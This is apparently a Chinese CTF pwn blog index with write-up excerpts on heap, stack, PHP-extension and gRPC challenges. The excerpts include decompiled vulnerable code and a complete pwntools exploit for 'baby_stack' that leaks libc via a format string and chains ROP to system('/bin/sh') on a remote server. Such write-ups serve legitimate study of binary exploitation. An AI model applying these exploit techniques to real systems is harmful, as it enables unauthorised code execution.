  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">LODWORD</span><span class="token punctuation">(</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x500</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wrong!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v0 <span class="token operator">=</span> book<span class="token punctuation">;</span>
  p<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token function">LODWORD</span><span class="token punctuation">(</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token operator">++</span>book<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">delete_the_book</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which book would you want to delete?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">></span> <span class="token number">5</span> <span class="token operator">||</span> <span class="token operator">!</span>p<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wrong!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do you want to say anything else before being deleted?(y/n)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> d <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">89</span> <span class="token operator">||</span> buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">121</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which page do you want to write?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">4</span> <span class="token operator">||</span> <span class="token operator">!</span>p<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wrong!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x18uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">--</span>d<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> d <span class="token punctuation">)</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ok!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no ways!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>约束非常多，程序没有canary，给了一个elf的地址，并且把execve给禁用了，通过large bin attack插入时利用构造一个任意地址写，往book那写一个很大的数字，这样edit read的时候就能溢出覆盖返回地址，然后就是正常的rop + orw了</p>
	
	</div>
  <a type="button" href="/2024/07/22/dasctf2024-summer-challenge/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/07/15/wkctf-pwn/" >wkctf_pwn</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-07-15  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/wkctf_pwn">https://github.com/nyyyddddn/ctf/tree/main/wkctf_pwn</a></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h2><p>在guess number逻辑这里用格式化字符串泄露 libc地址后</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Bh] [rbp-85h] BYREF</span>
  <span class="token keyword">char</span> format<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-80h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Press enter to continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Pick a number: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">snprintf</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">,</span> <span class="token string">"Your magic number is: %%%d$llx\n"</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>echo 这存在一个 off by null的溢出，有大量的leave ret的逻辑，走完这些leave ret 栈就被迁移到了buf上，由于不知道具体位置，找大量的 nop: ret的gadget写满buf，再结尾写一个system binsh的rop就好了，有可能会因为system中 xmm寄存器 rsp对齐的原因失败，多跑几次就好了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">echo</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-100h] BYREF</span>

  <span class="token keyword">return</span> <span class="token function">echo_inner</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">int</span> __fastcall <span class="token function">echo_inner</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  a1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">fread</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You said:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"110.40.35.73"</span>
PORT <span class="token operator">=</span> <span class="token number">33632</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">"Press enter to continue"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>


sla<span class="token punctuation">(</span><span class="token string">"Pick a number:"</span><span class="token punctuation">,</span><span class="token string">"6"</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"Your magic number is: "</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ec7e3</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002164f</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000003f8e8</span>
nop_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000001b5a8</span>




sla<span class="token punctuation">(</span><span class="token string">"How many bytes do you want to read (max 256)?"</span><span class="token punctuation">,</span><span class="token string">"256"</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>nop_ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> 
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span><span class="token string">b'\x61'</span><span class="token punctuation">)</span>

<span class="token comment"># g(p)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


<span class="token comment"># g(p)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>





<h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2>
	
	</div>
  <a type="button" href="/2024/07/15/wkctf-pwn/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/06/30/d3ctf-pwnshell复现/" >d3ctf_pwnshell复现</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-06-30  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="pwnshell-复现-php-pwn"><a href="#pwnshell-复现-php-pwn" class="headerlink" title="pwnshell 复现 (php pwn)"></a>pwnshell 复现 (php pwn)</h2><h3 id="如何调试？"><a href="#如何调试？" class="headerlink" title="如何调试？"></a>如何调试？</h3><p>php pwn该如何调试？在docker中装一个gdbserver，用gdbserver起一个程序，在exp中用能触发io中断的php函数打”断点”，之后用gdb连上去后在vuln.so里打个断点就好了</p>
<p>能触发io中断的函数，比如说fgetc</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$char</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"You entered: <span class="token interpolation"><span class="token variable">$char</span></span>\n"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在pwnshell这个题目中php配置文件里禁用了fgetc这个函数，修改php.ini中的disable_functions，把fgetc删掉就可以使用这个函数了</p>
<h3 id="调试相关的命令"><a href="#调试相关的命令" class="headerlink" title="调试相关的命令"></a>调试相关的命令</h3><h4 id="安装gdbserver"><a href="#安装gdbserver" class="headerlink" title="安装gdbserver"></a>安装gdbserver</h4><p>只需要在dockerfile里面加上安装的参数，之后构建镜像就好了</p>
<pre class="line-numbers language-none"><code class="language-none">FROM php:8.3-apache

RUN DEBIAN_FRONTEND&#x3D;noninteractive
RUN apt-get update &amp;&amp; apt-get install -y vim gdbserver

COPY .&#x2F;stuff&#x2F;php.ini &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php
COPY .&#x2F;stuff&#x2F;vuln.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20230831
COPY .&#x2F;stuff&#x2F;readflag &#x2F;
COPY .&#x2F;flag.txt &#x2F;flag.txt
COPY .&#x2F;stuff&#x2F;index.php &#x2F;var&#x2F;www&#x2F;html
RUN chmod 400 &#x2F;flag.txt
RUN chmod u+sx &#x2F;readflag
RUN chmod -R 777 &#x2F;var&#x2F;www&#x2F;html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2024/06/30/d3ctf-pwnshell复现/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/06/25/xctf-ggbord复现/" >xctf_ggbord复现</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-06-25  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="ggbond"><a href="#ggbond" class="headerlink" title="ggbond"></a>ggbond</h2><p>可以发现主函数是main_main，同时存在大量grpc字段，可以判断出程序使用了grpc框架。和grpc框架开发的程序进行交互，需要提取protobuf，protobuf谷歌开发的数据序列化格式，它通常用于网络通信和数据存储的应用程序之间的结构化数据交换。这个工具让你能够定义交互时消息的数据结构。</p>
<p>程序套了grpc，与程序的交互不再直接通过标准输入，而需要通过定义的 gRPC 服务接口来进行，然后grpc 使用一个叫protobuf的结构去描述怎么和程序交互的，首先需要提取出程序中的protobuf，然后python中有一个叫grpc_tools的库可以通过 protobuf文件生成和程序交互的代码。</p>
<p>github上有一个叫pbtk的项目可以提取出elf的 protobuf结构</p>
<p>使用 pbtk提取 protobuf文件</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;pbtk&#x2F;extractors&#x2F;from_binary.py pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>提取出来的protobuf文件</p>
<pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto3"</span><span class="token punctuation">;</span>

<span class="token keyword">package</span> GGBond<span class="token punctuation">;</span>

<span class="token keyword">option</span> go_package <span class="token operator">=</span> <span class="token string">"./;ggbond"</span><span class="token punctuation">;</span>

<span class="token keyword">service</span> <span class="token class-name">GGBondServer</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">rpc</span> <span class="token function">Handler</span><span class="token punctuation">(</span><span class="token class-name">Request</span><span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token class-name">Response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">Request</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">oneof</span> request <span class="token punctuation">&#123;</span>
        <span class="token positional-class-name class-name">WhoamiRequest</span> whoami <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
        <span class="token positional-class-name class-name">RoleChangeRequest</span> role_change <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">;</span>
        <span class="token positional-class-name class-name">RepeaterRequest</span> repeater <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">Response</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">oneof</span> response <span class="token punctuation">&#123;</span>
        <span class="token positional-class-name class-name">WhoamiResponse</span> whoami <span class="token operator">=</span> <span class="token number">200</span><span class="token punctuation">;</span>
        <span class="token positional-class-name class-name">RoleChangeResponse</span> role_change <span class="token operator">=</span> <span class="token number">201</span><span class="token punctuation">;</span>
        <span class="token positional-class-name class-name">RepeaterResponse</span> repeater <span class="token operator">=</span> <span class="token number">202</span><span class="token punctuation">;</span>
        <span class="token positional-class-name class-name">ErrorResponse</span> error <span class="token operator">=</span> <span class="token number">444</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">WhoamiRequest</span> <span class="token punctuation">&#123;</span>
    
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">WhoamiResponse</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2000</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">RoleChangeRequest</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">uint32</span> role <span class="token operator">=</span> <span class="token number">1001</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">RoleChangeResponse</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2001</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">RepeaterRequest</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">1002</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">RepeaterResponse</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">2002</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">message</span> <span class="token class-name">ErrorResponse</span> <span class="token punctuation">&#123;</span>
    <span class="token builtin">string</span> message <span class="token operator">=</span> <span class="token number">4444</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>使用grpc_tools 生成和程序交互的函数库的命令</p>
<pre class="line-numbers language-none"><code class="language-none">python -m grpc_tools.protoc -I. --python_out&#x3D;. --grpc_python_out&#x3D;. .&#x2F;ggbond.proto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2024/06/25/xctf-ggbord复现/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/06/19/vsctf-pwn/" >vsctf_pwn</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-06-19  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/vsctf_pwn">https://github.com/nyyyddddn/ctf/tree/main/vsctf_pwn</a></p>
